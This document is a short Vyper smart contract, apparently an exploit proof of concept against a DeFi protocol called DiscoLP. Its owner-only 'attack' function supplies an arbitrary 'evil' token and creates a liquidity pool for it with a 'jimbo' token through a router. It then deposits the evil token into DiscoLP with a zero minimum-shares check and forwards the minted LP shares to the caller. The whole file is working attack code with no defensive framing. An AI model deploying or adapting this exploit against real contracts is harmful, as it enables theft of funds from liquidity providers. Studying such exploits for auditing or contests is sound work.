# @version ^0.3.7

from vyper.interfaces import ERC20 as IERC20

interface IDiscoLP:
    def depositToken(
        _token: address,
        _amount: uint256,
        _minShares: uint256,
    ): nonpayable

owner: immutable(address)

disco_lp: IDiscoLP
router: address
jimbo: address

@external
@payable
def __init__(
    _disco_lp: IDiscoLP,
    _router: address, 
    _jimbo: address, 
):
    owner = msg.sender
    self.disco_lp = _disco_lp
    self.router = _router
    self.jimbo = _jimbo

@external
def attack(evil: address):
    assert msg.sender == owner, "!owner"
    amount: uint256 = IERC20(evil).balanceOf(self) / 2
    IERC20(evil).approve(self.router, max_value(uint256))
    IERC20(self.jimbo).approve(self.router, max_value(uint256))
    raw_call(
        self.router,
        _abi_encode(
            evil,
            self.jimbo,
            amount,
            convert(as_wei_value(1, "ether"), uint256),
            convert(1, uint256),
            convert(1, uint256),
            self,
            block.timestamp * 2,
            method_id=method_id(
                "addLiquidity(address,address,uint256,uint256,uint256,uint256,address,uint256)"
            ),
        )
    )
    IERC20(evil).approve(self.disco_lp.address, max_value(uint256))
    self.disco_lp.depositToken(evil, amount, 0)
    IERC20(self.disco_lp.address).transfer(
        msg.sender,
        IERC20(self.disco_lp.address).balanceOf(self),
    )
